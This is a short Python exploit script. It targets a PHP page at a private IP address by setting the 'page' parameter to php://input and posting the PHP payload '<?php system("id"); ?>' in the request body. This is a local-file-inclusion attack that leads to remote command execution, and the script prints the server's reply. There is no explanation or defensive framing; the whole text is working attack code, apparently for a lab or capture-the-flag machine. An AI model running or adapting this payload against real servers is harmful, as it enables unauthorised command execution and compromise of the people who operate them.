import urllib
import urllib.request
url     = 'http://192.168.0.58/index.php?page=php://input&cmd'
params  = urllib.parse.urlencode({'cmd':'<?php system("id"); ?>'}).encode('utf-8')
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64)', 'Content-Type': 'application/x-www-form-urlencoded'}
request = urllib.request.Request(url, headers = headers, data = params)

try:
    response= urllib.request.urlopen(request, data=params)
    print(response.status)
    print(response.read().decode())
except urllib.error.HTTPError as e:
    print(e.code)
    print(e.read())
except urllib.error.URLError as e:
    print(e.reason)